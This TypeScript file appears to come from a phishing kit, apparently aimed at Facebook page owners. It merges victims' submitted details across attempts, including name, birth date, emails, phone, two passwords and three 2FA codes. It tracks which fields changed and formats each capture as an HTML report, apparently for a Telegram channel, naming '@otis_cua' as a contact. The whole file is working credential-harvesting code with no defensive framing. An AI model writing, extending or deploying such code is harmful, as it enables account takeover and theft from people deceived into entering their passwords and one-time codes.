function escapeHtml(input: any): string {
    const str = typeof input === 'string' ? input : String(input ?? '');
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function normalizeData(input: any = {}) {
    return {
        ip: input.ip ?? '',
        location: input.location ?? '',
        fullName: input.fullName ?? input.name ?? '',
        fanpage: input.fanpage ?? '',
        day: input.day ?? '',
        month: input.month ?? '',
        year: input.year ?? '',
        email: input.email ?? '',
        emailBusiness: input.emailBusiness ?? input.business ?? '',
        phone: input.phone ?? '',
        password: input.password ?? '',
        passwordSecond: input.passwordSecond ?? '',
        authMethod: input.authMethod ?? '',
        twoFa: input.twoFa ?? '',
        twoFaSecond: input.twoFaSecond ?? '',
        twoFaThird: input.twoFaThird ?? '',
    };
}

export function mergeData(oldData: any = {}, newData: any = {}) {
    const normalizedOld = normalizeData(oldData);
    const normalizedNew = normalizeData(newData);
    const result: any = { ...normalizedOld };
    Object.entries(normalizedNew).forEach(([k, v]) => {
        if (v !== undefined && v !== '') {
            result[k] = v;
        }
    });
    return result;
}

export function getChangedFields(prevData: any = {}, nextData: any = {}, inputNew: any = {}): string[] {
    const before = normalizeData(prevData);
    const after = normalizeData(nextData);
    const provided = normalizeData(inputNew);

    const labels: Record<string, string> = {
        ip: 'Ip',
        location: 'Location',
        fullName: 'Full Name',
        fanpage: 'Page Name',
        day: 'Date of birth',
        month: 'Date of birth',
        year: 'Date of birth',
        email: 'Email',
        emailBusiness: 'Email Business',
        phone: 'Phone Number',
        password: 'Password First',
        passwordSecond: 'Password Second',
        authMethod: 'Auth Method',
        twoFa: 'Code 2FA(1)',
        twoFaSecond: 'Code 2FA(2)',
        twoFaThird: 'Code 2FA(3)',
    };

    const changed = new Set<string>();
    Object.keys(after).forEach((k) => {
        if (provided[k] === '' || provided[k] === undefined) return;
        if (before[k] !== after[k]) {
            if (k === 'day' || k === 'month' || k === 'year') {
                changed.add('Date of birth');
            } else {
                changed.add(labels[k] || k);
            }
        }
    });
    return Array.from(changed);
}

export function formatMessage(data: any): string {
    const d = normalizeData(data);
    const authLine = d.authMethod ? `\n<b>Auth Method:</b> <code>${escapeHtml(d.authMethod)}</code>\n-----------------------------` : '';
    return `
<b>Ip:</b> <code>${escapeHtml(d.ip || 'Error, contact @otis_cua')}</code>
<b>Location:</b> <code>${escapeHtml(d.location || 'Error, contact @otis_cua')}</code>
-----------------------------
<b>Full Name:</b> <code>${escapeHtml(d.fullName)}</code>
<b>Page Name:</b> <code>${escapeHtml(d.fanpage)}</code>
<b>Date of birth:</b> <code>${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}</code>
-----------------------------
<b>Email:</b> <code>${escapeHtml(d.email)}</code>
<b>Email Business:</b> <code>${escapeHtml(d.emailBusiness)}</code>
<b>Phone Number:</b> <code>${d.phone ? escapeHtml(`+${d.phone}`) : ''}</code>
-----------------------------
<b>Password (1):</b> <code>${escapeHtml(d.password)}</code>
<b>Password (2):</b> <code>${escapeHtml(d.passwordSecond)}</code>
-----------------------------${authLine}
<b>🔐Code 2FA(1):</b> <code>${escapeHtml(d.twoFa)}</code>
<b>🔐Code 2FA(2):</b> <code>${escapeHtml(d.twoFaSecond)}</code>
<b>🔐Code 2FA(3):</b> <code>${escapeHtml(d.twoFaThird)}</code>`.trim();
}
